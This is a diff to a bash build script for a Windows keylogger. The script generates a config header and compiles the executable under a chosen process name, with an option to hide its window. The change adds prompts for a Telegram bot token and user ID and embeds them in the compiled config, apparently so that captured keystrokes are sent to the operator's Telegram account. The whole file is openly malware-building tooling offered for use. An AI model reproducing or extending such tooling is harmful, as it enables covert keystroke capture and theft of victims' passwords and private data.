@@ -59,6 +59,9 @@ else
     log_to_console="false"
 fi
 
+read -p "Enter the TG bot token: " bot_token
+read -p "Enter the user id TG: " tg_user_id
+
 if [ -z "$path_to_ico" ]; then
     if [ -f src/resources/icon_d.ico ]; then
         cp src/resources/icon_d.ico src/resources/icon.ico
@@ -84,6 +87,8 @@ echo "Process name: $process_name"
 echo "Log to file: $log_to_file"
 echo "Hide window: $hide_window"
 echo "Log to console: $log_to_console"
+echo "Bot token: $bot_token"
+echo "User ID: $tg_user_id"
 
 read -p "Start build? (y/n): " is_build
 if [[ ! "$is_build" =~ ^[Yy]$ ]]; then
@@ -98,37 +103,45 @@ echo -e "\033[0;33mGenerating config...\033[0m"
 
 echo "#pragma once" > src/config.h
 echo "#include <string>" >> src/config.h
-echo "const bool        logToFile     = ${log_to_file};" >> src/config.h
-echo "const bool        logToConsole  = ${log_to_console};" >> src/config.h
-echo "const bool        hideWindow    = ${hide_window};" >> src/config.h
+echo "const bool           logToFile     = ${log_to_file};" >> src/config.h
+echo "const bool           logToConsole  = ${log_to_console};" >> src/config.h
+echo "const bool           hideWindow    = ${hide_window};" >> src/config.h
+echo "const std::wstring   botToken      = L\"${bot_token}\";" >> src/config.h
+echo "const std::wstring   userID        = L\"${tg_user_id}\";" >> src/config.h
 
 cd src
 echo -e "\033[0;33mRemoving old build files...\033[0m"
 make clean
+
 echo -e "\033[0;33mStarting keylogger build...\033[0m"
-make TARGET=${process_name}.exe
-rm config.h
+if make TARGET=${process_name}.exe; then
+    echo -e "\033[0;32mCompleted\033[0m"
+    rm config.h
+    
+    clear
+    
+    echo -e "\033[0;32m  ______                                     __             __               \033[0m"
+    echo -e "\033[0;32m /      \                                   |  \           |  \              \033[0m"
+    echo -e "\033[0;32m|  888888\\  ______   ______ ____    ______  | 88  ______  _| 88_     ______  \033[0m"
+    echo -e "\033[0;32m| 88   \\88 /      \ |      \    \  /      \ | 88 /      \|   88 \   /      \ \033[0m"
+    echo -e "\033[0;32m| 88      |  888888\\| 888888\\8888\\|  888888\\| 88|  888888\\\\888888  |  888888\033[0m"
+    echo -e "\033[0;32m| 88   __ | 88  | 88| 88 | 88 | 88| 88  | 88| 88| 88    88 | 88 __ | 88    88\033[0m"
+    echo -e "\033[0;32m| 88__/  \\| 88__/ 88| 88 | 88 | 88| 88__/ 88| 88| 88888888 | 88|  \\| 88888888\033[0m"
+    echo -e "\033[0;32m \\88    88 \\88    88| 88 | 88 | 88| 88    88| 88 \\88     \\  \\88  88 \\88      \033[0m"
+    echo -e "\033[0;32m  \\888888   \\888888  \\88  \\88  \\88| 8888888  \\88  \\8888888   \\8888   \\8888888\033[0m"
+    echo -e "\033[0;32m                                  | 88                                       \033[0m"
+    echo -e "\033[0;32m                                  | 88                                       \033[0m"
+    echo -e "\033[0;32m                                   \\88                                       \033[0m"
 
-echo -e "\033[0;32m  ______                                     __             __               \033[0m"
-echo -e "\033[0;32m /      \                                   |  \           |  \              \033[0m"
-echo -e "\033[0;32m|  888888\\  ______   ______ ____    ______  | 88  ______  _| 88_     ______  \033[0m"
-echo -e "\033[0;32m| 88   \\88 /      \ |      \    \  /      \ | 88 /      \|   88 \   /      \ \033[0m"
-echo -e "\033[0;32m| 88      |  888888\\| 888888\\8888\\|  888888\\| 88|  888888\\\\888888  |  888888\033[0m"
-echo -e "\033[0;32m| 88   __ | 88  | 88| 88 | 88 | 88| 88  | 88| 88| 88    88 | 88 __ | 88    88\033[0m"
-echo -e "\033[0;32m| 88__/  \\| 88__/ 88| 88 | 88 | 88| 88__/ 88| 88| 88888888 | 88|  \\| 88888888\033[0m"
-echo -e "\033[0;32m \\88    88 \\88    88| 88 | 88 | 88| 88    88| 88 \\88     \\  \\88  88 \\88      \033[0m"
-echo -e "\033[0;32m  \\888888   \\888888  \\88  \\88  \\88| 8888888  \\88  \\8888888   \\8888   \\8888888\033[0m"
-echo -e "\033[0;32m                                  | 88                                       \033[0m"
-echo -e "\033[0;32m                                  | 88                                       \033[0m"
-echo -e "\033[0;32m                                   \\88                                       \033[0m"
+    spacer
 
-spacer
-
-if [ -f "${process_name}.exe" ]; then
-    echo -e "\033[0;32mYOUR KEYLOGGER: \033[0m"
-    echo -e "\033[0;36m$(realpath ${process_name}.exe)\033[0m"
+    if [ -f "${process_name}.exe" ]; then
+        echo -e "\033[0;32mYOUR KEYLOGGER: \033[0m"
+        echo -e "\033[0;36m$(realpath ${process_name}.exe)\033[0m"
+    else
+        echo -e "\033[0;31mFile ${process_name}.exe not found after successful build!\033[0m"
+    fi
 else
-    echo -e "\033[0;31mFile src/${process_name}.exe not found! Please check that the build was successful.\033[0m"
-    echo -e "\033[0;31mAvailable exe files in src:\033[0m"
-    ls -1 *.exe 2>/dev/null || echo "No exe files."
+    echo -e "\033[0;31mBuild failed with the following errors:\033[0m"
+    make TARGET=${process_name}.exe 2>&1 | tee /dev/stderr
 fi
